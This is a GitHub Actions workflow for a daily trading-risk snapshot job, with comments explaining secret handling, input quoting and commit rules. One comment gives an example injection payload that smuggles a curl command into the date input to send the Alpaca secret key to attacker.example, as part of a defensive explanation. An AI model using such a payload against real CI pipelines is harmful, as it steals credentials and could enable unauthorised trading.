name: Daily risk snapshot

on:
  schedule:
    # 11:00 UTC on weekdays: after the US close in every DST offset, and early
    # enough that the previous session's SIP data is well past the 15-minute
    # embargo. Runs are commonly delayed 10-30 minutes; nothing here assumes
    # exact timing. Monday's run processes Friday's session, which is correct.
    - cron: "0 11 * * 1-5"
  workflow_dispatch:
    inputs:
      date:
        description: "Session to process (YYYY-MM-DD). Blank = last completed."
        required: false
      skip_orders:
        description: "Snapshot only, never rebalance"
        type: boolean
        default: false

# Serialise runs. Two jobs writing data/risk.db concurrently would produce a
# conflict git cannot merge (CLAUDE.md, "Committing data/risk.db").
concurrency:
  group: daily-risk-snapshot
  cancel-in-progress: false

permissions:
  contents: write

jobs:
  snapshot:
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-python@v5
        with:
          python-version: "3.14"
          cache: pip

      - name: Install dependencies
        run: pip install -r requirements.txt

      # Dispatch inputs reach the shell through the environment, never through
      # ${{ }} interpolation into the run block. Interpolation happens before
      # bash sees the script, so a `date` input of
      #
      #     2026-07-01; curl -d "$ALPACA_SECRET_KEY" https://attacker.example
      #
      # would become a second command in a step that holds the API secrets and
      # has contents: write. Passing through env means bash receives the value
      # as data and never as script text.
      #
      # The array build is deliberate. skip_orders is a boolean input, so on a
      # dispatch with defaults the variable holds the *string* "false" -- which
      # is non-empty, and a ${VAR:+--skip-orders} form would therefore pass the
      # flag on every dispatch run and silently stop the job ever trading. It
      # has to be compared against "true", not tested for emptiness.
      #
      # Quoting "$INPUT_DATE" keeps it a single argument whatever it contains;
      # argparse and the NYSE calendar reject anything that is not a real
      # session.
      - name: Run daily job
        env:
          ALPACA_API_KEY: ${{ secrets.ALPACA_API_KEY }}
          ALPACA_SECRET_KEY: ${{ secrets.ALPACA_SECRET_KEY }}
          INPUT_DATE: ${{ inputs.date }}
          INPUT_SKIP_ORDERS: ${{ inputs.skip_orders }}
        run: |
          args=()
          if [ -n "$INPUT_DATE" ]; then
            args+=(--date "$INPUT_DATE")
          fi
          if [ "$INPUT_SKIP_ORDERS" = "true" ]; then
            args+=(--skip-orders)
          fi
          python -m src.jobs.daily "${args[@]}"

      # Runs even when the job above fails, so the failure heartbeat reaches
      # the repo. Without it a failed run is invisible: GitHub sends no
      # notification for a failed scheduled workflow.
      #
      # Restricted to main. The job writes data/risk.db on every run, including
      # a workflow_dispatch against a feature branch -- and a feature branch
      # carries whatever copy of the database it was cut from. Committing there
      # writes a snapshot derived from stale inputs onto a branch that will
      # later be merged, which is how a fortnight of sessions gets silently
      # reverted. This has happened once already.
      #
      # CLAUDE.md says CI is the only writer that commits; this makes the
      # unstated other half of that rule explicit, which is that it commits on
      # one branch only. Dispatching against a branch remains useful for
      # testing the job itself -- it simply leaves no rows behind.
      - name: Commit database
        if: always() && github.ref_name == 'main'
        run: |
          git config user.name  "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"

          if git diff --quiet -- data/risk.db; then
            echo "No database changes to commit."
            exit 0
          fi

          git add data/risk.db
          git commit -m "data: daily snapshot $(date -u +%Y-%m-%d)"

          # CI is the only committing writer, but a manual dispatch can race a
          # scheduled run. Rebase rather than merge; the DB is binary and a
          # merge commit would be unresolvable.
          for attempt in 1 2 3; do
            if git pull --rebase origin "${GITHUB_REF_NAME}" && \
               git push origin "HEAD:${GITHUB_REF_NAME}"; then
              echo "Pushed on attempt ${attempt}."
              exit 0
            fi
            echo "Push attempt ${attempt} failed; retrying."
            sleep 5
          done
          echo "Could not push after 3 attempts." >&2
          exit 1
